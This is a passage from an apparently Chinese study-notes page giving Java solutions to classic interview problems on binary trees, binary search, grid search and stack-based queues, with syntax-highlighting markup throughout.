class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isSymmetrical</span><span class="params">(TreeNode pRoot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pRoot==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">return</span> isSymmetrical(pRoot.left,pRoot.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isSymmetrical</span><span class="params">(TreeNode p,TreeNode q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==<span class="keyword">null</span>&amp;&amp;p==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(q==<span class="keyword">null</span>||p==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> q.val==p.val&amp;&amp;isSymmetrical(q.left,p.right)&amp;&amp;isSymmetrical(q.right,p.left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉树的深度">二叉树的深度 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">TreeDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Math.max(find(root.left,<span class="number">1</span>),find(root.right,<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(TreeNode root,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> depth;</span><br><span class="line">    <span class="keyword">return</span> Math.max(find(root.left,depth+<span class="number">1</span>),find(root.right,depth+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="序列化二叉树-">序列化二叉树 -</span></h2><p>请实现两个函数，分别用来序列化和反序列化二叉树</p><p>二叉树的序列化是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 某种符号表示空节点（#），以 ！ 表示一个结点值的结束（value!）。</p><p>二叉树的反序列化是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">Serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serial(root,<span class="keyword">new</span> StringBuilder());</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="function">String <span class="title">serial</span><span class="params">(TreeNode root,StringBuilder sb )</span></span>&#123;        </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            sb.append(<span class="string">"#,"</span>);</span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(root.val+<span class="string">","</span>);</span><br><span class="line">        serial(root.left,sb);</span><br><span class="line">        serial(root.right,sb);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode <span class="title">Deserialize</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        String[] s=str.split(<span class="string">","</span>);</span><br><span class="line">       <span class="keyword">return</span> deserial(<span class="keyword">new</span> LinkedList(Arrays.asList(s)));</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="function">TreeNode <span class="title">deserial</span><span class="params">(LinkedList&lt;String&gt; l)</span></span>&#123;</span><br><span class="line">       String tmp = l.poll();</span><br><span class="line">        <span class="keyword">if</span>(tmp.equals(<span class="string">"#"</span>)) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        TreeNode root=<span class="keyword">new</span> TreeNode(Integer.valueOf(tmp));</span><br><span class="line">        root.left=deserial(l);</span><br><span class="line">        root.right=deserial(l);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉搜索树的第k个结点">二叉搜索树的第k个结点 √</span></h2><p>给定一棵二叉搜索树，请找出其中的第k小的结点。例如， （5，3，7，2，4，6，8）  中，按结点数值大小顺序第三小结点的值为4。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode ret;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">KthNode</span><span class="params">(TreeNode pRoot, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    inOrder(pRoot, k);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span> || cnt &gt;= k)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inOrder(root.left, k);</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="keyword">if</span> (cnt == k)</span><br><span class="line">        ret = root;</span><br><span class="line">    inOrder(root.right, k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉树的下一个结点-">二叉树的下一个结点 -</span></h2><p>给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeLinkNode <span class="title">GetNext</span><span class="params">(TreeLinkNode pNode)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(pNode.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            TreeLinkNode tmp=pNode.right;</span><br><span class="line">           <span class="keyword">while</span>(tmp.left!=<span class="keyword">null</span>)&#123;              </span><br><span class="line">               tmp=tmp.left;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> tmp;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           TreeLinkNode parent=pNode.next;</span><br><span class="line">           <span class="keyword">while</span>(parent!=<span class="keyword">null</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(parent.left==pNode) <span class="keyword">return</span> parent;</span><br><span class="line">               pNode=parent;</span><br><span class="line">               parent=parent.next;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="树的子结构">树的子结构 √</span></h2><p>输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">HasSubtree</span><span class="params">(TreeNode root1,TreeNode root2)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root1==<span class="keyword">null</span>||root2==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">return</span> check(root1,root2)||HasSubtree(root1.left,root2)||HasSubtree(root1.right,root2);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(TreeNode root1,TreeNode root2)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root2==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       <span class="keyword">if</span>(root1==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="keyword">return</span> root1.val==root2.val&amp;&amp;check(root1.left,root2.left)&amp;&amp;check(root1.right,root2.right);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉树中和为某一值的路径">二叉树中和为某一值的路径 √</span></h2><p>输入一颗二叉树的根节点和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。(注意: 在返回值的list中，数组长度大的数组靠前)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root,<span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">return</span> find(root,target,<span class="keyword">new</span> ArrayList&lt;Integer&gt;(),<span class="keyword">new</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; find(TreeNode root,<span class="keyword">int</span> target,ArrayList&lt;Integer&gt; tmp,ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res)&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">if</span>(target==root.val&amp;&amp;root.left==root.right)&#123;</span><br><span class="line">            tmp.add(root.val);</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList(tmp));</span><br><span class="line">            tmp.remove(tmp.size()-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp.add(root.val);</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)</span><br><span class="line">        find(root.left,target-root.val,tmp,res);</span><br><span class="line">        find(root.right,target-root.val,tmp,res);</span><br><span class="line">        tmp.remove(tmp.size()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉搜索树和双向链表-">二叉搜索树和双向链表 -</span></h2><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode pre = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> TreeNode head = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">Convert</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    inOrder(root);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inOrder(node.left);</span><br><span class="line">    node.left = pre;</span><br><span class="line">    <span class="keyword">if</span> (pre != <span class="keyword">null</span>)</span><br><span class="line">        pre.right = node;</span><br><span class="line">    pre = node;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span>)</span><br><span class="line">        head = node;</span><br><span class="line">    inOrder(node.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二叉搜索树的后序遍历序列">二叉搜索树的后序遍历序列 √</span></h2><p>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">VerifySquenceOfBST</span><span class="params">(<span class="keyword">int</span> [] sequence)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sequence.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> lo=<span class="number">0</span>,hi=sequence.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> find(sequence,lo,hi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] sequence,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lo&gt;=hi) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot=sequence[hi];</span><br><span class="line">    <span class="keyword">int</span> index=lo;</span><br><span class="line">    <span class="keyword">for</span>(;index&lt;hi;index++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sequence[index]&gt;pivot) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=index;i&lt;hi;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sequence[i]&lt;pivot) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> find(sequence,lo,index-<span class="number">1</span>)&amp;&amp;find(sequence,index,hi-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id></span></h1><h1><span id="二分查找">二分查找</span></h1><h2><span id="旋转数组的最小数字">旋转数组的最小数字 √</span></h2><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。<br>输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。<br>例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。<br>NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minNumberInRotateArray</span><span class="params">(<span class="keyword">int</span> [] array)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">int</span> lo=<span class="number">0</span>,hi=array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(array[lo]&lt;array[hi]) <span class="keyword">return</span> array[lo];</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[array.length-<span class="number">1</span>]) lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[lo];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="搜索">搜索</span></h1><h2><span id="矩阵中的路径">矩阵中的路径 √</span></h2><p>请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如 </p><p><img src="image-20200408115329051.png" alt="image-20200408115329051"></p><p>矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> dir[][] = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPath</span><span class="params">(<span class="keyword">char</span>[] matrix, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">char</span>[] str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = matrix.length;</span><br><span class="line">        <span class="keyword">boolean</span> visited[] = <span class="keyword">new</span> <span class="keyword">boolean</span>[len];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i*cols+j]==str[<span class="number">0</span>])&#123;</span><br><span class="line">                    visited[i*cols+j]=<span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">if</span>(dfs(matrix,rows,cols,i,j,str,visited,<span class="number">0</span>))</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                    visited[i*cols+j]=<span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[] matrix, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">char</span>[] str, <span class="keyword">boolean</span>[] visited, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = i*cols+j;</span><br><span class="line">        <span class="keyword">if</span>(k==str.length-<span class="number">1</span>&amp;&amp;str[k]==matrix[index]) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] direct:dir)&#123;</span><br><span class="line">            <span class="keyword">int</span> x=i+direct[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> y=j+direct[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(x&lt;rows&amp;&amp;x&gt;=<span class="number">0</span>&amp;&amp;y&lt;cols&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;visited[x*cols+y]==<span class="keyword">false</span>&amp;&amp;str[k]==matrix[index])&#123;</span><br><span class="line">                visited[x*cols+y]=<span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(dfs(matrix,rows,cols,x,y,str,visited,k+<span class="number">1</span>)) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                visited[x*cols+y]=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="机器人的运动范围">机器人的运动范围 √</span></h2><p>地上有一个m行和n列的方格。一个机器人从坐标0,0的格子开始移动，每一次只能向左，右，上，下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于k的格子。 例如，当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。但是，它不能进入方格（35,38），因为3+5+3+8 = 19。请问该机器人能够达到多少个格子？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] direction = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">movingCount</span><span class="params">(<span class="keyword">int</span> threshold, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(threshold&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        set.add(<span class="number">0</span>);</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,rows,cols,threshold,set);</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols, <span class="keyword">int</span> threshold, HashSet&lt;Integer&gt; set)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] dir : direction) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = i+dir[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> y=j+dir[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> index = x*cols+y;</span><br><span class="line">            <span class="keyword">if</span> (x&gt;=<span class="number">0</span>&amp;&amp;x&lt;rows&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;cols&amp;&amp;!set.contains(index)&amp;&amp;judge(x,y,threshold))&#123;</span><br><span class="line">                set.add(index);</span><br><span class="line">                dfs(x,y,rows,cols,threshold,set);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y,<span class="keyword">int</span> threshold)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> xVal=<span class="number">0</span>,yVal=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            xVal+=x%<span class="number">10</span>;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(y!=<span class="number">0</span>)&#123;</span><br><span class="line">            yVal+=y%<span class="number">10</span>;</span><br><span class="line">            y=y/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(xVal+yVal);</span></span><br><span class="line">        <span class="keyword">return</span> xVal+yVal&lt;=threshold;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="栈和队列">栈和队列</span></h1><h2><span id="用两个栈实现队列">用两个栈实现队列 √</span></h2><p>用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Stack&lt;Integer&gt; in = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">Stack&lt;Integer&gt; out = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">    